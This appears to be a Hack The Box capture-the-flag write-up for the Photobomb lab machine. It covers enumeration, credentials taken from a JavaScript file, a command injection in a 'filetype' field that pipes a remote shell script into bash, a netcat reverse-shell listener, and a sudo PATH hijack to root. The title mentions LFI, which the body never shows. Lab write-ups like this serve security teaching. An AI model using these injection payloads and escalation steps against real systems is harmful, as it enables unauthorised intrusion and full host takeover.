---
layout: writeup
title: "Hack The Box — Photobomb: From LFI to Root via PATH Hijack"
date: 2026-03-15
category: HackTheBox
difficulty: Easy
ctf: HackTheBox
tags: [ctf]
tools: [nmap, curl, burp-suite, bash]
description: >
  A Linux box running a Ruby Sinatra app with hardcoded credentials exposed in
  a JS file. Initial access via a blind command injection, privilege escalation
  via an unsanitized PATH in a sudo rule.
---

## Enumeration

Start with an `nmap` scan to see what's exposed:

```bash
nmap -sC -sV -oA photobomb 10.10.11.182
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    nginx 1.18.0
```

Navigating to port 80 redirects to `photobomb.htb`. Add it to `/etc/hosts`:

```bash
echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

The site loads a JavaScript file that contains hardcoded credentials:

```javascript
// photobomb.js
function init() {
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementById("cheatcode").style.display = "flex";
  }
}
// [redacted — credentials visible in source]
```

Credentials: `pH0t0:b0Mb!`

Use them to authenticate to `/printer`.

---

## Foothold — Command Injection

The `/printer` endpoint accepts a `filetype` parameter for downloading images.
Testing with a semicolon reveals a command injection:

```bash
curl -s -u "pH0t0:b0Mb!" \
  "http://photobomb.htb/printer" \
  -d "photo=voights-robbie.jpg&filetype=jpg;curl+10.10.14.10/shell.sh|bash&dimensions=30x20"
```

Set up a listener and catch the shell:

```bash
nc -lvnp 4444
```

We land as `wizard`.

---

## Privilege Escalation — PATH Hijack

Check `sudo` rules:

```bash
sudo -l
```

```
(root) SETENV: NOPASSWD: /opt/cleanup.sh
```

The script calls `find` without an absolute path. Since `SETENV` is allowed,
we can inject our own `PATH`:

```bash
echo '#!/bin/bash\nbash' > /tmp/find
chmod +x /tmp/find
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

We get a root shell. Grab the flag:

```bash
cat /root/root.txt
```

---

## Key Takeaways

- Always check JS source files for exposed secrets
- Test every parameter for command injection with `;`, `|`, `&&`
- `SETENV` in sudo rules is a privilege escalation vector if the script uses unqualified commands
